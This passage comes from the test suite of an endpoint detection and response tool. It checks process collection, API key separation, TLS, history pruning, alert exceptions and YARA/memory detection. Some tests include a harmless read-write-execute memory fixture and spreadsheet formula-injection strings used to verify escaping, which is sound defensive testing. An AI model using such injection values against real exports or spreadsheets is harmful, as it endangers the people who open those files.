        self.assertEqual([e["reason"] for e in first], ["protected"])
        self.assertEqual(second, [])                       # same reason again, not repeated
        rec["next_mem"] = 0
        with mock.patch.object(memlib, "analyze", side_effect=memlib.MemoryAccessError("x", "gone")):
            self.assertEqual(col._memory_events(30.0), [])
        rec["next_mem"] = 0
        with mock.patch.object(memlib, "analyze", return_value={"summary": {}, "regions": []}):
            ok = col._memory_events(40.0)
        self.assertEqual(ok[0]["type"], "memory_scan")
        self.assertNotIn("unreadable", rec)


class _FakeSource:
    """Stands in for the OS notification thread."""

    def __init__(self):
        from collections import deque
        self.pending = deque()

    def status(self):
        return {"kind": "fake", "active": True, "error": None, "seen": 0, "read": 0, "missed": 0}

    def stop(self):
        pass


class ProcessEventTests(unittest.TestCase):
    def collector(self):
        from edr.collector.collector import Collector
        c = Collector(memscan=False, initial_spread=0.0)
        c.events = _FakeSource()
        return c

    def hint(self, pid, ct, ts, name="x.exe", partial=False, proc=None):
        info = {"pid": pid, "ppid": 1, "name": name, "exe": "", "cmdline": [name], "username": "u", "create_time": ct}
        h = {"proc": proc, "info": info, "ts": ts}
        if partial:
            h["partial"] = True
        return h

    def test_nothing_before_the_first_poll(self):
        c = self.collector()
        c.events.pending.append(self.hint(5, 100.0, 1.0))
        self.assertIsNone(c.flush_hints())
        self.assertEqual(len(c.events.pending), 1)          # kept for the first poll

    def test_short_lived_process_gets_start_and_exit(self):
        c = self.collector()
        c._first_poll = False
        import psutil
        pid = 3_000_000
        while psutil.pid_exists(pid):
            pid += 1
        c.events.pending.append(self.hint(pid, 100.0, 50.0, partial=True))
        batch = c.flush_hints()
        kinds = [(e["type"], e["pid"]) for e in batch["events"]]
        self.assertEqual(kinds, [("process_start", pid), ("process_exit", pid)])
        self.assertEqual(batch["events"][0]["ts"], 50.0)          # the moment it was announced, not the next poll
        self.assertEqual(c.stats["short_lived"], 1)
        self.assertNotIn((pid, 100000), c.known)

    def test_running_process_is_tracked_once(self):
        import psutil
        c = self.collector()
        c._first_poll = False
        me = psutil.Process()
        info = me.as_dict(attrs=["pid", "ppid", "name", "exe", "cmdline", "username", "create_time"])
        c.events.pending.append({"proc": me, "info": info, "ts": 77.0})
        batch = c.flush_hints()
        self.assertEqual([e["type"] for e in batch["events"]], ["process_start"])
        self.assertEqual(batch["events"][0]["ts"], 77.0)
        self.assertEqual(len(c.known), 1)
        c.events.pending.append({"proc": me, "info": info, "ts": 78.0})
        self.assertIsNone(c.flush_hints())                    # already followed, no duplicate

    def test_poll_uses_the_announced_time_and_records_ghosts(self):
        c = self.collector()
        import psutil
        pid = 3_100_000
        while psutil.pid_exists(pid):
            pid += 1
        c.events.pending.append(self.hint(pid, 100.0, 55.0, name="ghost.exe", partial=True))
        batch = c.poll()
        starts = {e["pid"]: e for e in batch["events"] if e["type"] == "process_start"}
        self.assertEqual(starts[pid]["ts"], 55.0)
        self.assertTrue(any(e["type"] == "process_exit" and e["pid"] == pid for e in batch["events"]))

    def test_kernel_threads_and_pid_zero_from_the_source_are_ignored(self):
        c = self.collector()
        c._first_poll = False
        c.events.pending.append(self.hint(0, 1.0, 1.0))
        self.assertIsNone(c.flush_hints())

    @unittest.skipUnless(IS_LINUX, "netlink process connector is Linux only")
    def test_netlink_parser_takes_process_exec_and_skips_thread_exec(self):
        import struct
        from edr.collector import events as ev
        got = []

        class Probe(ev.ProcConnector):
            def _seen(self, pid, name=None, ppid=None):
                got.append(pid)

        def msg(what, a, b):
            data = struct.pack("=IIQ", what, 0, 0) + struct.pack("=II", a, b)
            cn = struct.pack("=IIIIHH", 1, 1, 0, 0, len(data), 0) + data
            return struct.pack("=IHHII", 16 + len(cn), 3, 0, 0, 0) + cn

        raw = msg(2, 100, 100) + msg(2, 101, 100) + msg(1, 5, 5) + msg(2, 102, 102)
        Probe()._parse(raw + b"\x00\x01")                  # trailing garbage must not break it
        self.assertEqual(got, [100, 102])

    @unittest.skipUnless(IS_LINUX, "netlink process connector is Linux only")
    def test_live_source_sees_a_short_lived_process_if_permitted(self):
        from edr.collector import events as ev
        src = ev.create()
        src.start()
        time.sleep(0.7)
        if not src.active:
            src.stop()
            self.skipTest(f"event source unavailable here: {src.error}")
        try:
            pids = []
            for _ in range(5):
                p = subprocess.Popen(["/bin/sleep", "0.2"])
                pids.append(p.pid)
            time.sleep(0.5)
            seen = {h["info"]["pid"] for h in list(src.pending)}
            self.assertTrue(set(pids) & seen, f"none of {pids} announced, saw {sorted(seen)[:10]}")
        finally:
            src.stop()


class IngestKeyTests(TestCase):
    """Remote agents get a key that can only send data."""

    def setUp(self):
        self.c = APIClient()
        self.op = {"HTTP_X_AETHER_KEY": settings.API_KEY}
        self.agent = {"HTTP_X_AETHER_KEY": settings.INGEST_KEY}
        self.batch = {"host": _host(), "events": []}

    def test_keys_differ(self):
        self.assertNotEqual(settings.API_KEY, settings.INGEST_KEY)

    def test_agent_key_can_ingest(self):
        self.assertEqual(self.c.post("/api/ingest/", self.batch, format="json", **self.agent).status_code, 202)
        self.assertEqual(self.c.post("/api/ingest/", self.batch, format="json", **self.op).status_code, 202)

    def test_agent_key_cannot_read_or_act(self):
        for path in ("/api/alerts/", "/api/processes/", "/api/system/", "/api/hosts/", "/api/rules/", "/api/actions/"):
            self.assertEqual(self.c.get(path, **self.agent).status_code, 403, path)
        self.assertEqual(self.c.post("/api/maintenance/clear/", {"dry_run": True}, format="json", **self.agent).status_code, 403)
        self.assertEqual(self.c.get("/api/alerts/export/?type=csv", **self.agent).status_code, 403)
        self.assertEqual(self.c.get("/api/alerts/", **self.op).status_code, 200)

    def test_bad_or_missing_key(self):
        self.assertEqual(self.c.post("/api/ingest/", self.batch, format="json").status_code, 401)
        self.assertEqual(self.c.post("/api/ingest/", self.batch, format="json", HTTP_X_AETHER_KEY="nope").status_code, 401)
        self.assertEqual(self.c.get("/api/health/").status_code, 200)       # health stays open

    def test_system_view_shows_agent_key_to_operator_only(self):
        self.assertEqual(self.c.get("/api/system/", **self.op).json()["ingest_key"], settings.INGEST_KEY)


class LauncherFirstRunTests(unittest.TestCase):
    def test_missing_packages_give_instructions_not_a_traceback(self):
        import contextlib
        import io
        from unittest import mock

        from aether import launcher

        out = io.StringIO()
        with mock.patch.dict(sys.modules, {"django": None}), contextlib.redirect_stdout(out):
            code = launcher.main(["--no-browser", "--port", "0"])
        self.assertEqual(code, 1)
        self.assertIn("pip install -r requirements.txt", out.getvalue())


class ShutdownTests(TestCase):
    """The Exit button: operator key and confirmation needed, and only when the launcher can stop the program."""

    def setUp(self):
        self.c = APIClient()
        self.op = {"HTTP_X_AETHER_KEY": settings.API_KEY}
        self.agent = {"HTTP_X_AETHER_KEY": settings.INGEST_KEY}
        self.stopped = threading.Event()
        self.addCleanup(runtime.state.pop, "shutdown", None)
        self.addCleanup(runtime.state.pop, "stopping", None)

    def test_needs_confirm(self):
        runtime.state["shutdown"] = self.stopped.set
        r = self.c.post("/api/system/shutdown/", {}, format="json", **self.op)
        self.assertEqual(r.status_code, 400)
        self.assertFalse(self.stopped.wait(1.2))

    def test_stops_with_operator_key(self):
        runtime.state["shutdown"] = self.stopped.set
        r = self.c.post("/api/system/shutdown/", {"confirm": True}, format="json", **self.op)
        self.assertEqual(r.status_code, 202)
        self.assertTrue(self.stopped.wait(3))

    def test_agent_key_and_no_key_cannot_stop_it(self):
        runtime.state["shutdown"] = self.stopped.set
        self.assertEqual(self.c.post("/api/system/shutdown/", {"confirm": True}, format="json", **self.agent).status_code, 403)
        self.assertEqual(self.c.post("/api/system/shutdown/", {"confirm": True}, format="json").status_code, 401)
        self.assertEqual(self.c.get("/api/system/shutdown/", **self.op).status_code, 405)
        self.assertFalse(self.stopped.wait(1.2))

    def test_cannot_stop_when_not_started_by_launcher(self):
        runtime.state.pop("shutdown", None)
        r = self.c.post("/api/system/shutdown/", {"confirm": True}, format="json", **self.op)
        self.assertEqual(r.status_code, 409)
        self.assertIn("run.py", r.json()["detail"])

    def test_status_says_whether_it_can_stop(self):
        self.assertFalse(self.c.get("/api/overview/", **self.op).json()["agent"]["can_stop"])
        runtime.state["shutdown"] = self.stopped.set
        self.assertTrue(self.c.get("/api/overview/", **self.op).json()["agent"]["can_stop"])


class TlsTests(unittest.TestCase):
    """The built-in HTTPS option: generated certificate and the TLS front."""

    @classmethod
    def setUpClass(cls):
        import tempfile
        from aether.tlsgen import make_self_signed
        cls.dir = tempfile.mkdtemp()
        cert, key, cls.info = make_self_signed(["localhost", "127.0.0.1", "::1"])
        cls.cert, cls.key = f"{cls.dir}/c.pem", f"{cls.dir}/k.pem"
        open(cls.cert, "w").write(cert)
        open(cls.key, "w").write(key)

    def _backend(self, handler_body=b"hello", status=200):
        import threading
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

        seen = {}

        class H(BaseHTTPRequestHandler):
            def _reply(self):
                n = int(self.headers.get("Content-Length") or 0)
                seen["body"] = self.rfile.read(n) if n else b""
                seen["key"] = self.headers.get("X-Aether-Key")
                self.send_response(status)
                self.send_header("Content-Length", str(len(handler_body)))
                self.end_headers()
                self.wfile.write(handler_body)

            do_GET = do_POST = _reply

            def log_message(self, *a):
                pass

        srv = ThreadingHTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        self.addCleanup(srv.shutdown)
        return srv.server_address[1], seen

    def _front(self, backend_port):
        from aether.tlsproxy import TlsFront
        front = TlsFront("127.0.0.1", 0, backend_port, self.cert, self.key)
        front.start()
        self.addCleanup(front.stop)
        return front.port

    def test_certificate_is_valid_and_names_are_covered(self):
        import shutil, subprocess
        if not shutil.which("openssl"):
            self.skipTest("openssl not installed")
        out = subprocess.run(["openssl", "x509", "-in", self.cert, "-noout", "-ext", "subjectAltName,basicConstraints"],
                             capture_output=True, text=True).stdout
        self.assertIn("DNS:localhost", out)
        self.assertIn("IP Address:127.0.0.1", out)
        self.assertIn("CA:FALSE", out)
        ok = subprocess.run(["openssl", "verify", "-CAfile", self.cert, self.cert], capture_output=True, text=True)
        self.assertIn("OK", ok.stdout)

    def test_https_round_trip_and_the_key_stays_off_the_wire(self):
        import ssl, urllib.request
        backend, seen = self._backend(b"hello over tls")
        port = self._front(backend)
        ctx = ssl.create_default_context(cafile=self.cert)          # default strict verification
        req = urllib.request.Request(f"https://localhost:{port}/x", data=b"payload" * 20000, method="POST",
                                     headers={"X-Aether-Key": "secret-key-123"})
        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
            self.assertEqual(r.read(), b"hello over tls")
        self.assertEqual(seen["body"], b"payload" * 20000)             # large bodies pass through intact
        self.assertEqual(seen["key"], "secret-key-123")

    def test_untrusted_or_wrong_name_is_rejected(self):
        import ssl, urllib.error, urllib.request
        backend, _ = self._backend()
        port = self._front(backend)
        with self.assertRaises(urllib.error.URLError):                  # system trust store does not know it
            urllib.request.urlopen(f"https://localhost:{port}/", timeout=5)
        ctx = ssl.create_default_context(cafile=self.cert)
        with self.assertRaises(urllib.error.URLError):                  # certificate is not for this name
            urllib.request.urlopen(f"https://127.0.0.2:{port}/", timeout=5, context=ctx)

    def test_plain_http_to_the_tls_port_gets_nothing_useful(self):
        import socket
        backend, _ = self._backend()
        port = self._front(backend)
        with socket.create_connection(("127.0.0.1", port), timeout=5) as s:
            s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
            s.settimeout(5)
            try:
                data = s.recv(1024)
            except OSError:
                data = b""
        self.assertNotIn(b"hello", data)

    def test_agent_sink_trusts_only_the_given_certificate(self):
        import urllib.error
        from edr.collector.agent import HttpSink
        backend, seen = self._backend(b"{}", status=202)
        port = self._front(backend)
        batch = {"host": {"host_id": "h"}, "events": []}
        HttpSink(f"https://localhost:{port}", "agent-key", ca_cert=self.cert).send(batch)
        self.assertEqual(seen["key"], "agent-key")
        with self.assertRaises(urllib.error.URLError):
            HttpSink(f"https://localhost:{port}", "agent-key").send(batch)

    def test_launcher_refuses_network_bind_without_tls(self):
        import contextlib, io
        from aether.launcher import main
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = main(["--host", "0.0.0.0", "--no-browser"])
        self.assertEqual(code, 1)
        self.assertIn("--tls", out.getvalue())


class ClearHistoryTests(TestCase):
    URL = "/api/maintenance/clear/"

    def setUp(self):
        from datetime import timedelta
        from django.utils import timezone
        self.now = timezone.now()
        self.td = timedelta
        self.c = APIClient()
        self.key = {"HTTP_X_AETHER_KEY": settings.API_KEY}
        pipeline.ingest({"host": _host(), "events": [
            _start(200, 4, "WINWORD.EXE", "C:\\Office\\WINWORD.EXE", t=1000.0),
            _start(300, 200, "cmd.exe", "C:\\Windows\\System32\\cmd.exe", t=1010.0),
            _start(400, 4, "old.exe", "C:\\Users\\u\\AppData\\Local\\Temp\\old.exe", t=1020.0)]})
        self.word = Process.objects.get(pid=200)
        self.cmd = Process.objects.get(pid=300)
        self.old = Process.objects.get(pid=400)
        Alert.objects.create(host=self.old.host, process=self.old, dedupe_key="t:old:1", rule_id="EXE-001", title="Temp launch",
                             severity="high", score=60, weight=30, process_name="old.exe", pid=400,
                             first_seen=self.now, last_seen=self.now)
        Connection.objects.create(process=self.old, direction="outbound", proto="tcp", raddr="1.2.3.4", rport=443,
                                  lport=50000, first_seen=self.now)

    def post(self, body):
        return self.c.post(self.URL, body, format="json", **self.key)

    def end(self, proc, days_ago):
        Process.objects.filter(pk=proc.pk).update(ended_at=self.now - self.td(days=days_ago))

    def test_requires_key_and_confirmation(self):
        self.assertEqual(self.c.post(self.URL, {"confirm": True}, format="json").status_code, 401)
        r = self.post({})
        self.assertEqual(r.status_code, 400)
        self.assertIn("confirm", r.json())
        self.assertEqual(Process.objects.count(), 3)

    def test_rejects_bad_input(self):
        for body in ({"older_than_days": "abc"}, {"older_than_days": -1}, {"older_than_days": 99999},
                     {"older_than_days": True}, {"alerts": "yes"}, {"host": "x"}):
            r = self.post(dict(body, confirm=True))
            self.assertEqual(r.status_code, 400, body)
        self.assertEqual(Process.objects.count(), 3)

    def test_dry_run_counts_and_deletes_nothing(self):
        self.end(self.old, 10)
        before = (Process.objects.count(), Alert.objects.count(), Connection.objects.count())
        r = self.post({"dry_run": True}).json()
        self.assertTrue(r["dry_run"])
        self.assertEqual(r["counts"]["processes"], 1)
        self.assertEqual(r["counts"]["connections"], 1)
        self.assertEqual(r["counts"]["running_kept"], 2)
        self.assertEqual(r["counts"]["alerts"], 1)
        self.assertEqual((Process.objects.count(), Alert.objects.count(), Connection.objects.count()), before)

    def test_everything_removes_ended_but_never_running(self):
        self.end(self.old, 1)
        running_alerts = Alert.objects.filter(process=self.cmd).count()
        old_alerts = Alert.objects.filter(process=self.old).count()
        self.assertGreater(old_alerts, 0)
        r = self.post({"confirm": True}).json()
        self.assertEqual(r["counts"]["processes"], 1)
        self.assertEqual(r["counts"]["alerts"], old_alerts)
        self.assertFalse(Process.objects.filter(pk=self.old.pk).exists())
        self.assertFalse(Connection.objects.exists())
        self.assertTrue(Process.objects.filter(pk=self.cmd.pk).exists())
        self.assertEqual(Alert.objects.filter(process=self.cmd).count(), running_alerts)

    def test_older_than_days_keeps_recent(self):
        self.end(self.old, 2)
        r = self.post({"older_than_days": 7, "confirm": True}).json()
        self.assertEqual(r["counts"]["processes"], 0)
        self.assertEqual(r["counts"]["alerts"], 0)
        self.assertTrue(Process.objects.filter(pk=self.old.pk).exists())
        self.end(self.old, 10)
        Alert.objects.filter(process=self.old).update(last_seen=self.now - self.td(days=10))
        r = self.post({"older_than_days": 7, "confirm": True}).json()
        self.assertEqual(r["counts"]["processes"], 1)
        self.assertFalse(Process.objects.filter(pk=self.old.pk).exists())
        self.assertFalse(Alert.objects.filter(process_name="old.exe").exists())

    def test_alerts_can_be_kept(self):
        self.end(self.old, 3)
        n = Alert.objects.filter(process=self.old).count()
        r = self.post({"alerts": False, "confirm": True}).json()
        self.assertEqual(r["counts"]["alerts"], 0)
        self.assertEqual(Alert.objects.filter(process_name="old.exe").count(), n)   # kept, now detached from the process

    def test_ended_parent_of_a_running_process_is_kept(self):
        self.end(self.word, 30)           # parent ended, its child cmd.exe is still running
        r = self.post({"confirm": True}).json()
        self.assertEqual(r["counts"]["processes"], 0)
        self.assertEqual(r["counts"]["lineage_kept"], 1)
        self.assertEqual(Process.objects.get(pk=self.cmd.pk).parent_id, self.word.pk)
        self.end(self.cmd, 30)            # once the child ends too, both can go
        r = self.post({"confirm": True}).json()
        self.assertEqual(r["counts"]["processes"], 2)
        self.assertFalse(Process.objects.filter(pk__in=[self.word.pk, self.cmd.pk]).exists())

    def test_automatic_prune_also_keeps_parents_of_running_processes(self):
        from edr.engine import maintenance
        self.end(self.word, 400)          # far past the retention window, child still running
        self.end(self.old, 400)
        maintenance.prune()
        self.assertTrue(Process.objects.filter(pk=self.word.pk).exists())
        self.assertFalse(Process.objects.filter(pk=self.old.pk).exists())

    def test_exceptions_and_action_log_survive(self):
        from edr.models import ActionLog, Suppression
        Suppression.objects.create(rule_id="MEM-001", note="keep me")
        ActionLog.objects.create(kind="suspend", pid=400, name="old.exe", ok=True)
        self.end(self.old, 5)
        self.post({"confirm": True})
        self.assertEqual(Suppression.objects.count(), 1)
        self.assertEqual(ActionLog.objects.count(), 1)

    def test_system_view_reports_ended_count(self):
        self.end(self.old, 1)
        counts = self.c.get("/api/system/", **self.key).json()["counts"]
        self.assertEqual(counts["ended"], 1)


@unittest.skipUnless(IS_LINUX and yara_scanner.AVAILABLE, "live /proc + yara test")
class LiveCollectorTests(TransactionTestCase):
    """Real collector + real process memory + real YARA scan against a harmless RWX fixture."""

    def test_end_to_end_rwx_detection_and_yara(self):
        child = subprocess.Popen([sys.executable, "-c",
            "import mmap,time;m=mmap.mmap(-1,8192,prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC);"
            "m.write(b'AETHEREDR_YARA_SELFTEST_MARKER_7f3a');time.sleep(60)"])
        try:
            time.sleep(1.0)
            col = Collector(initial_spread=0.0, memscan_delays=(0.0,), memscan_period=1.0)
            with mock.patch("edr.engine.jobs.submit_auto"):
                pipeline.ingest(col.poll())
                pipeline.ingest(col.poll())
            p = Process.objects.get(pid=child.pid)
            self.assertGreaterEqual(p.mem_summary.get("rwx_regions", 0), 1)
            self.assertTrue(any(f["rule_id"] == "MEM-001" for f in p.findings))
            self.assertTrue(p.mem_regions and p.mem_regions[0]["rwx"])

            from edr.engine import jobs
            from edr.models import YaraJob
            from django.utils import timezone
            Host.objects.filter(pk=p.host_id).update(host_id=host_info()["host_id"])
            job = YaraJob.objects.create(process=p, scope="flagged", requested_at=timezone.now())
            jobs._run(job.id)
            job.refresh_from_db()
            self.assertEqual(job.status, "done", job.error)
            self.assertIn("AetherEDR_SelfTest", [m["rule"] for m in job.matches])
            # the python binary on disk starts with an ELF header: the memory-only rule must not fire on it
            self.assertNotIn("Packed_Or_Injected_ELF_In_Memory", [m["rule"] for m in job.matches if m["source"] == "file"])
            self.assertGreaterEqual(job.regions_scanned, 1)
            p.refresh_from_db()
            self.assertTrue(any(h["rule"] == "AetherEDR_SelfTest" for h in p.yara_hits))
            self.assertTrue(Alert.objects.filter(process=p, rule_id__startswith="YARA.").exists())

            # refuses to scan the agent itself
            me = Process.objects.filter(pid=__import__("os").getpid()).first()
            if me:
                j2 = YaraJob.objects.create(process=me, requested_at=timezone.now())
                jobs._run(j2.id)
                j2.refresh_from_db()
                self.assertEqual(j2.status, "error")
        finally:
            child.kill()
            child.wait()


class ExceptionTests(TestCase):
    def setUp(self):
        self.c = APIClient()
        self.key = {"HTTP_X_AETHER_KEY": settings.API_KEY}
        pipeline.ingest({"host": _host(), "events": [
            _start(200, 4, "WINWORD.EXE", "C:\\Office\\WINWORD.EXE", t=1000.0),
            _start(300, 200, "cmd.exe", "C:\\Windows\\System32\\cmd.exe", t=1010.0)]})
        self.proc = Process.objects.get(pid=300)

    def _open(self):
        return Alert.objects.filter(status="open").count()

    def test_exception_silences_and_removal_restores(self):
        self.assertGreaterEqual(self._open(), 1)
        self.assertGreater(self.proc.risk_score, 0)
        r = self.c.post("/api/exceptions/", {"rule_id": "LIN-001", "exe": "C:\\Windows\\System32\\CMD.EXE", "note": "test"},
                        format="json", **self.key)
        self.assertEqual(r.status_code, 201, r.content)
        sid = r.json()["id"]
        self.assertEqual(r.json()["exe"], "c:\\windows\\system32\\cmd.exe")      # normalised
        self.proc.refresh_from_db()
        self.assertEqual(self.proc.risk_score, 0)
        self.assertEqual(self.proc.findings, [])
        self.assertEqual(self.proc.muted[0]["rule_id"], "LIN-001")                # kept for transparency
        self.assertEqual(self._open(), 0)
        listed = self.c.get("/api/exceptions/", **self.key).json()
        self.assertEqual(listed[0]["silenced"], 1)
        detail = self.c.get(f"/api/processes/{self.proc.id}/", **self.key).json()
        self.assertEqual(detail["muted"][0]["suppression"], sid)

        self.assertEqual(self.c.delete(f"/api/exceptions/{sid}/", **self.key).status_code, 204)
        self.proc.refresh_from_db()
        self.assertGreater(self.proc.risk_score, 0)
        self.assertEqual(self.proc.muted, [])
        self.assertGreaterEqual(self._open(), 1)

    def test_disable_reopens_and_validation(self):
        sid = self.c.post("/api/exceptions/", {"rule_id": "LIN-*"}, format="json", **self.key).json()["id"]
        self.assertEqual(self._open(), 0)
        self.assertEqual(self.c.patch(f"/api/exceptions/{sid}/", {"enabled": False}, format="json", **self.key).status_code, 200)
        self.assertGreaterEqual(self._open(), 1)
        self.assertEqual(self.c.post("/api/exceptions/", {}, format="json", **self.key).status_code, 400)
        self.assertEqual(self.c.post("/api/exceptions/", {"rule_id": "*"}, format="json", **self.key).status_code, 400)

    def test_exception_does_not_match_other_programs(self):
        self.c.post("/api/exceptions/", {"rule_id": "LIN-001", "exe": "c:\\other\\cmd.exe"}, format="json", **self.key)
        self.proc.refresh_from_db()
        self.assertGreater(self.proc.risk_score, 0)

    def test_rules_system_and_export(self):
        rl = self.c.get("/api/rules/", **self.key).json()
        ids = {r["id"] for r in rl["rules"]}
        self.assertTrue({"LIN-001", "MEM-001", "CMD-001", "NET-005", "YARA.*"} <= ids)
        lin = next(r for r in rl["rules"] if r["id"] == "LIN-001")
        self.assertGreaterEqual(lin["alerts_open"], 1)
        sysd = self.c.get("/api/system/", **self.key).json()
        self.assertEqual(sysd["api_key"], settings.API_KEY)
        self.assertIn("counts", sysd)
        csv_resp = self.c.get("/api/alerts/export/?type=csv", **self.key)
        self.assertEqual(csv_resp.status_code, 200)
        self.assertIn("text/csv", csv_resp["Content-Type"])
        self.assertIn("LIN-001", csv_resp.content.decode("utf-8-sig"))
        self.assertEqual(self.c.get("/api/alerts/export/?type=json", **self.key).json()[0]["rule_id"] != "", True)
        self.assertEqual(self.c.get("/api/alerts/export/?type=xml", **self.key).status_code, 400)

    def test_csv_cells_cannot_inject_formulas(self):
        from edr.views import _cell

        self.assertEqual(_cell("=HYPERLINK(\"x\")"), "'=HYPERLINK(\"x\")")
        self.assertEqual(_cell("+1"), "'+1")
        self.assertEqual(_cell("cmd.exe"), "cmd.exe")
        self.assertEqual(_cell(None), "")

    def test_respond_refuses_remote_and_unknown_actions(self):
        self.assertEqual(self.c.post(f"/api/processes/{self.proc.id}/respond/", {"action": "explode"}, format="json", **self.key).status_code, 400)
        r = self.c.post(f"/api/processes/{self.proc.id}/respond/", {"action": "terminate"}, format="json", **self.key)
        self.assertEqual(r.status_code, 400)          # the demo host is not this endpoint
        self.assertIn("endpoint", r.json()[0] if isinstance(r.json(), list) else str(r.json()))

    def test_unhandled_errors_are_json(self):
        with mock.patch("edr.views.pipeline.ingest", side_effect=RuntimeError("boom")):
            r = self.c.post("/api/ingest/", {"host": _host(), "events": []}, format="json", **self.key)
        self.assertEqual(r.status_code, 500)
        self.assertIn("Internal error", r.json()["detail"])


class CatalogAndFalsePositiveTests(SimpleTestCase):
    def test_catalog_covers_every_rule_id_in_source(self):
        import re
        from pathlib import Path

        from edr.engine import catalog

        src = Path(rules.__file__).read_text()
        ids = set(re.findall(r'Finding\(\s*"([A-Z]+-\d+)"', src)) | {r[0] for r in rules._CMD}
        have = {c["id"] for c in catalog.catalog()}
        self.assertEqual(ids - have, set(), "rules missing from edr/engine/catalog.py")

    def test_unnamed_mapped_executable_is_not_suspicious_on_windows(self):
        from edr.collector._winconst import MEM_MAPPED

        self.assertFalse(classify_region(MEM_MAPPED, PAGE_EXECUTE_READ, "")["susp_path"])
        tmp = "\\Device\\HarddiskVolume3\\Users\\n\\AppData\\Local\\Temp\\drop.dll"
        self.assertTrue(classify_region(MEM_MAPPED, PAGE_EXECUTE_READ, tmp)["susp_path"])
        self.assertTrue(classify_region(MEM_IMAGE, PAGE_EXECUTE_READ, tmp)["susp_path"])

    def test_jit_runtime_modules_downweight_memory_findings(self):
        R = memory.Region
        regions = [R(0, 4096, "r-x", "image", "\\Device\\HarddiskVolume3\\Program Files\\dotnet\\shared\\clrjit.dll")]
        self.assertEqual(memory.detect_runtimes(regions), ["clrjit.dll"])
        rwx = {"start": 4096, "size": 4096, "perms": "rwx-", "kind": "private", "rwx": True, "unbacked": True,
               "protect": "PAGE_EXECUTE_READWRITE", "path": ""}
        base = {"summary": {"rwx_regions": 1}, "regions": [rwx]}
        plain = rules.Ctx(proc={"name": "tool.exe", "exe": "C:\\x\\tool.exe", "pid": 5}, ancestors=[], os_name="Windows", mem=base)
        jit = rules.Ctx(proc={"name": "tool.exe", "exe": "C:\\x\\tool.exe", "pid": 5}, ancestors=[], os_name="Windows",
                        mem={"summary": {"rwx_regions": 1, "runtimes": ["clrjit.dll"]}, "regions": [rwx]})
        w = lambda ctx: next(f.weight for f in rules.evaluate(ctx) if f.rule_id == "MEM-001")  # noqa: E731
        self.assertEqual(w(plain), 40)
        self.assertEqual(w(jit), 8)


class SupervisorTests(SimpleTestCase):
    def test_dead_collector_is_restarted(self):
        import threading

        from edr.collector.agent import AgentThread, Supervisor

        class FakeCollector:
            memscan = False

            def __init__(self):
                self.wake = threading.Event()

            def poll(self):
                return {"host": {}, "events": []}

            def start_events(self):
                pass

            def flush_hints(self):
                return None

            def stop_events(self):
                self.wake.set()

        class Sink:
            def send(self, batch):
                pass

        dead = AgentThread(Sink(), FakeCollector(), interval=0.5)
        dead.start()
        dead.stop()
        dead.join(2)
        dead.stop_event = threading.Event()         # the thread ended without being asked to stop
        state = {"agent": dead}
        sup = Supervisor(state, interval=0.05)
        sup.start()
        time.sleep(0.4)
        sup.stop()
        fresh = state["agent"]
        try:
            self.assertIsNot(fresh, dead)
            self.assertEqual(fresh.restarts, 1)
        finally:
            fresh.stop()
